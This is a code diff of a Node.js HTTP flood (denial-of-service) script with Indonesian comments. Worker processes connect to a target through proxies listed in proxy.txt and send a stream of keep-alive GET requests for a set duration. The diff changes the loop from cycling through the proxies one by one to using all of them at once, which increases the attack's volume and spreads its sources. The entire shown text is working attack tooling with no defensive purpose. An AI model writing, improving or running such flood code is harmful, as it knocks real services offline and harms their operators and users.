@@ -38,63 +38,77 @@ if (cluster.isMaster) {
     });
 } else {
     const target = new URL(targetURL);
-    let proxyIndex = 0;
     const startTime = Date.now();
 
+    // Fungsi untuk mengirim request menggunakan proxy
     function sendTLSRequest(proxy) {
-        const proxyParts = proxy.trim().split(":");
-        if (proxyParts.length < 2) return;
-
-        const proxyHost = proxyParts[0];
-        const proxyPort = parseInt(proxyParts[1], 10);
-
-        const options = {
-            host: proxyHost,
-            port: proxyPort,
-            servername: target.hostname,
-            rejectUnauthorized: false
-        };
-
-        const client = tls.connect(options, () => {
-            function flood() {
-                if (Date.now() - startTime >= duration * 1000) {
-                    console.log(`Worker ${process.pid} stopping attack.`);
-                    process.exit(0);
-                }
-
-                for (let i = 0; i < rps; i++) {
-                    const request = `GET ${target.pathname} HTTP/1.1\r\n` +
-                                    `Host: ${target.hostname}\r\n` +
-                                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" +
-                                    "Accept: */*\r\n" +
-                                    "Connection: keep-alive\r\n\r\n";
-                    client.write(request);
-                }
-
-                setTimeout(flood, 10); // Delay kecil untuk mengurangi beban CPU
+        return new Promise((resolve, reject) => {
+            const proxyParts = proxy.trim().split(":");
+            if (proxyParts.length < 2) {
+                reject("Invalid proxy");
+                return;
             }
-            flood();
-        });
 
-        client.on("error", () => {
-            client.destroy();
-        });
+            const proxyHost = proxyParts[0];
+            const proxyPort = parseInt(proxyParts[1], 10);
 
-        client.on("close", () => {
-            client.destroy();
+            const options = {
+                host: proxyHost,
+                port: proxyPort,
+                servername: target.hostname,
+                rejectUnauthorized: false
+            };
+
+            const client = tls.connect(options, () => {
+                function flood() {
+                    if (Date.now() - startTime >= duration * 1000) {
+                        console.log(`Worker ${process.pid} stopping attack.`);
+                        process.exit(0);
+                    }
+
+                    for (let i = 0; i < rps; i++) {
+                        const request = `GET ${target.pathname} HTTP/1.1\r\n` +
+                                        `Host: ${target.hostname}\r\n` +
+                                        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" +
+                                        "Accept: */*\r\n" +
+                                        "Connection: keep-alive\r\n\r\n";
+                        client.write(request);
+                    }
+
+                    setTimeout(flood, 10); // Delay kecil untuk mengurangi beban CPU
+                }
+                flood();
+            });
+
+            client.on("error", (err) => {
+                console.error("Proxy error:", err);
+                client.destroy();
+                reject(err);
+            });
+
+            client.on("close", () => {
+                client.destroy();
+                resolve();
+            });
         });
     }
 
-    function attackLoop() {
+    // Fungsi untuk menjalankan serangan menggunakan semua proxy
+    async function attackLoop() {
         if (Date.now() - startTime >= duration * 1000) {
             console.log(`Worker ${process.pid} stopping attack.`);
             process.exit(0);
         }
 
-        const proxy = proxies[proxyIndex];
-        proxyIndex = (proxyIndex + 1) % proxies.length; 
+        // Menggunakan semua proxy dari file proxy.txt secara bersamaan
+        const allProxyRequests = proxies.map(proxy => sendTLSRequest(proxy));
 
-        sendTLSRequest(proxy);
+        try {
+            await Promise.all(allProxyRequests);  // Menjalankan semua proxy secara bersamaan
+        } catch (err) {
+            console.error("Error with proxy request:", err);
+        }
+
         setTimeout(attackLoop, 10); // Delay kecil agar CPU tidak overload
     }
 
